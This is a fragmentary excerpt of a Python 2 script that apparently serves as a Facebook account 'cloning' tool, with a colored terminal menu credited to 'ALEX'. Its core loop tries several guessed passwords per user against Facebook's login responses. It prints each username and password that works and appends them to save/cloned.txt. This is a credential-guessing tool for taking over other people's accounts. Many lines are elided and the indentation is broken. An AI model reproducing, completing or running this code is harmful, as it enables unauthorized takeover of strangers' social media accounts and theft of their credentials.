...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://m.facebook.com/govind.baria.7509.com')
    else:
...
def login():
    os.system('clear')
    print logo1
    print "\033[1;91m[1]\x1b[1;97mSTART WITH ALEX( \033[1;92m NOW)"
    time.sleep(0.05)
...
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;97m[1]  START CLONING With ALEX'
    time.sleep(0.10)
    print '\x1b[1;92m[2] ALEX FB ACCOUNT'
    time.sleep(0.10)
    ...
    time.sleep(0.10)
    print '\x1b[1;91m[6] ALEX FACEBOOK'
    time.sleep(0.10)
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;92m(AMKCP) ' + k + c + user + '  |  ' + pass1
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;92m(AMKCP) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;92m(AMKCP) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;92m(AMKCP) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
...
\033[1;95mFb\033[1;97mALey
\033[1;95myoutube\033[1;97mhttps://w ww.youtube.com/channel/aleykashanofficial"""
